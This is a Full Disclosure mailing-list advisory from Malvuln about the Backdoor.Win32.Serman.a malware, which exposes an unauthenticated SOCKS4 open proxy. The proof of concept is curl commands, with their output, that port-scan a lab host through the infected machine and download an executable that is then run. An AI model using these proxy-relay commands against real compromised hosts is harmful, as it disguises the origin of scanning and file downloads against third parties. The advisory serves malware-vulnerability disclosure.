---
title: Backdoor.Win32.Serman.a / Unauthenticated Open Proxy
url: https://seclists.org/fulldisclosure/2022/Nov/20
source: Full Disclosure
date: 2022-11-30
fetch_date: 2025-10-04T00:08:16.781324
---

# Backdoor.Win32.Serman.a / Unauthenticated Open Proxy

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](18)
[By Date](date.html#20)
[![Next](/images/right-icon-16x16.png)](21)

[![Previous](/images/left-icon-16x16.png)](18)
[By Thread](index.html#20)
[![Next](/images/right-icon-16x16.png)](21)

![](/shared/images/nst-icons.svg#search)

# Backdoor.Win32.Serman.a / Unauthenticated Open Proxy

---

*From*: malvuln <malvuln13 () gmail com>
*Date*: Tue, 22 Nov 2022 21:48:53 -0500

---

```
Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2022
Original source:
https://malvuln.com/advisory/f312e3a436995b86b205a1a37b1bf10f.txt
Contact: malvuln13 () gmail com
Media: twitter.com/malvuln
Backup media: infosec.exchange/@malvuln

Threat: Backdoor.Win32.Serman.a
Vulnerability: Unauthenticated Open Proxy
Family: Serman
Type: PE32
MD5: f312e3a436995b86b205a1a37b1bf10f
Vuln ID: MVID-2022-0659
Disclosure: 11/22/2022
Description: The malware listens on TCP port 21422 by default but it can be
changed. Third-party attackers who can connect to the infected system can
relay requests from the original connection to the destination and then
back to the origination system. Attackers may then be able to launch
attacks, download files or port scan third party systems and it will appear
as the attacks originated from that infected host.

E.g. using port 5555

SOCKS4 version 4A server (beta)
autor: Stanimir Jordanov * e-mail: stjordanov () hotmail com
Usage: socks4 <LocalPort> [LogFile]

C:\dump>wwm.exe 5555 out.txt
SOCKS 4 service started: redirecting localhost:5555
Press Ctrl+C to end ...
Connecting to: 192.168.18.128:80   ID:2C34
Connected to: 192.168.18.128:80   ID:2C34
Connection closed   ID:2C34
Connecting to: 192.168.18.128:80   ID:25BC
Connected to: 192.168.18.128:80   ID:25BC
Connection closed   ID:25BC
Connecting to: 192.168.18.128:80   ID:A4
Connected to: 192.168.18.128:80   ID:A4
Connection closed   ID:A4

Exploit/PoC:
Port scan:
Connecting to: 192.168.18.128:666   ID:2B04
Cannot connect to: 192.168.18.128:666   ID:2B04
Connecting to: 192.168.18.128:21   ID:2DE4
Connected to: 192.168.18.128:21   ID:2DE4
Connection closed   ID:2DE4

(Port scan):

(Port closed):
C:\Users\gg\Desktop>curl -x socks4://192.168.18.125:5555
http://192.168.18.128:666 -v
*   Trying 192.168.18.125:5555...
* SOCKS4 communication to 192.168.18.128:666
* SOCKS4 connect to IPv4 192.168.18.128 (locally resolved)
* Can't complete SOCKS4 connection to 0.0.0.0:0. (91), request rejected or
failed.
* Closing connection 0
curl: (97) Can't complete SOCKS4 connection to 0.0.0.0:0. (91), request
rejected or failed.

(Port open):
C:\Users\gg\Desktop>curl -x socks4://192.168.18.125:5555
http://192.168.18.128:21 -v
*   Trying 192.168.18.125:5555...
* SOCKS4 communication to 192.168.18.128:21
* SOCKS4 connect to IPv4 192.168.18.128 (locally resolved)
* SOCKS4 request granted.
* Connected to 192.168.18.125 (192.168.18.125) port 5555 (#0)
```

> ```
> GET / HTTP/1.1
> Host: 192.168.18.128:21
> User-Agent: curl/7.83.1
> Accept: */*
> ```

```
* Received HTTP/0.9 when not allowed
* Closing connection 0
curl: (1) Received HTTP/0.9 when not allowed

(Download files):
C:\Users\gg\Desktop>curl -x socks4://192.168.18.125:5555
http://192.168.18.128/DOOM.exe -v --output 2.txt
*   Trying 192.168.18.125:5555...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time
 Current
                                 Dload  Upload   Total   Spent    Left
 Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--
  0* SOCKS4 communication to 192.168.18.128:80
* SOCKS4 connect to IPv4 192.168.18.128 (locally resolved)
* SOCKS4 request granted.
* Connected to 192.168.18.125 (192.168.18.125) port 5555 (#0)
  GET /DOOM.exe HTTP/1.1
  Host: 192.168.18.128
  User-Agent: curl/7.83.1
  Accept: */*

* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
  HTTP/1.0 200 OK
  Server: SimpleHTTP/0.6 Python/2.7.6
  Date: Tue, 22 Nov 2022 02:15:31 GMT
  Content-type: application/x-msdos-program
  Content-Length: 103533
  Last-Modified: Sat, 03 Aug 2019 04:57:12 GMT

{ [6794 bytes data]
100  101k  100  101k    0     0   474k      0 --:--:-- --:--:-- --:--:--
 488k
* Closing connection 0

C:\Users\gg\Desktop>2.txt
DOOMED!!!
Press any key to continue . . .

Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory,
provided that it is not altered except by reformatting it, and that due
credit is given. Permission is explicitly given for insertion in
vulnerability databases and similar, provided that due credit is given to
the author. The author is not responsible for any misuse of the information
contained herein and accepts no responsibility for any damage caused by the
use or misuse of this information. The author prohibits any malicious use
of security related information or exploits by the author or elsewhere. Do
not attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper Malware
handling or the downloading of ANY Malware mentioned on this website or
elsewhere. All content Copyright (c) Malvuln.com (TM).
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](18)
[By Date](date.html#20)
[![Next](/images/right-icon-16x16.png)](21)

[![Previous](/images/left-icon-16x16.png)](18)
[By Thread](index.html#20)
[![Next](/images/right-icon-16x16.png)](21)

### Current thread:

* **Backdoor.Win32.Serman.a / Unauthenticated Open Proxy** *malvuln (Nov 29)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https:...